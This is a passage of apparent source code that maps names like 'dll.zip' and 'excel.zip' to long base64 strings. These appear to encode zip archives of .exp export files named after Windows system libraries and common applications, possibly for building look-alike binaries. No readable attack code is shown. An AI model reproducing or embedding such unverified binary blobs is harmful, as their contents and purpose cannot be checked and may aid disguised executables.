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"
	}
	if name == "dll.zip" {
		base64string = "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"
	}
	if name == "excel.zip" {
		base64string = "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